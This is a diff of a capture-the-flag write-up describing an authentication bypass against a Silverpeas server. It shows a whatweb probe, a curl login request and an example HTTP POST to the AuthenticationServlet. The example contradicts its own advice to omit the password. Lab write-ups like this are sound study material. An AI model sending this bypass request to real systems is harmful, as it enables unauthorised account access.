@@ -46,7 +46,7 @@ tried this but still we couldn't get a hit. but wait there is another port which
 ```bash
 whatweb http://10.80.162.213:8080/silverpeas
 ```
-we do not find any information on the versioon of silver peas so we jsut assume that it has the vulnerability to whichever search reuslt comes after googling for silverpeas exploit.
+we do not find any information on the versioon of silver peas so we jsut assume that it has the vulnerability to whichever search result comes after googling for silverpeas exploit.
 i found a promising report on github. you can read this if you want to: https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d
 
 now i will generate a php session cookie using curl and paste it in the cookies section by going to the developer tools of the login page.
@@ -61,7 +61,8 @@ curl -X POST http://10.80.162.213:8080/silverpeas/AuthenticationServlet \
 let me breakdown the attack vector for you. the thing is that this version of silverpeas is vulnerable to authentication bypass. the exploitation works in this flow:
 
 using burp of curl you pass a request to the login page but omit the password field.
-
+              |
+              V
 eg: POST /silverpeas/AuthenticationServlet HTTP/2
 
 Host: 212.129.58.88
@@ -71,6 +72,8 @@ Content-Length: 28
 Origin: https://212.129.58.88
 
 Content-Type: application/x-www-form-urlencoded
+              |
+              V
 
 Login=SilverAdmin&Password=SilverAdmin&DomainId=0
 
